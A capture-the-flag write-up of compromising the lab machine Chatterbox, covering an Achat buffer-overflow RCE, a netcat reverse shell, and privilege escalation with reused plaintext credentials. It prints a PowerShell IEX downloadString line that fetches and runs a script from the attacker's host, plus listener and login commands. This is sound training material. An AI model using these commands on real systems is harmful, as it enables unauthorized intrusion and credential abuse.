## üìù SUMMARY
 This machine has one HTTP service running on port 9255 however when trying to access to the url I didnt show any content at all, so doing research I found a Remote Execution BOF exploit in exploit database, I then change the script with my payload and I was able to recieved a ping, so I then was able to send a revershell to my kali machine, enumerating the system didnt find anything interesting, however when using PowerUp.ps1 I found Alfred's credentials in clear text, so I decided to try them with the Administrator and it was pwned! However when trying to read the root flag eventhough i was an administrator i wasnt able to, so i decided to open up RDP port and access to it using rdesktop being able to read the flag

## üîç ENUMERATION
- We found a **Achat** service that is running on port 9255 however we cant access to the webpage, when searching for exploit we found a RCE trough a BOF
![alt](/images/posts/chatterbox.png)
- I then created a payload to send a ping to my kali machine
![alt](/images/posts/chatterbox2.webp)
- Then i modified the script to add my payload and when i ran it i received a ping to my kali machine!
```bash
   sudo tcpdump -i tun0 icmp
```
![alt](/images/posts/chatterbox3.webp)
- I then downloaded the nc.exe binary to my kali machine and crafted a payload to connect to my smbserver to access the nc.exe and send a revershell to my kali machine

![alt](/images/posts/chatterbox5.webp)
- And I received a connection as the user alfred!
```bash
   rlwrap -cAr nc -nlvp 443
```

```
## üöÄ PRIVILEGE ESCALATION
- We use PowerUp to find possibles ways to escalate our privilege and we found alfred credentials in clear text
```powershell
   IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22/PowerUp.ps1')
```
![alt](/images/posts/chatterbox7.webp)
- Using netexec we try Alfred password as the administrator password and it was correct!
```bash
   netexec smb 10.10.10.74 -u 'Administrator' -p 'Welcome1!'
```
![alt](/images/posts/chatterbox8.webp)
## ROOT FLAG
- I opened rdp port and connected using rdesktop and I was then able to read the users root.txt
```bash
   rdesktop -u Administrator -p 'Welcome1!' 10.10.10.74
```
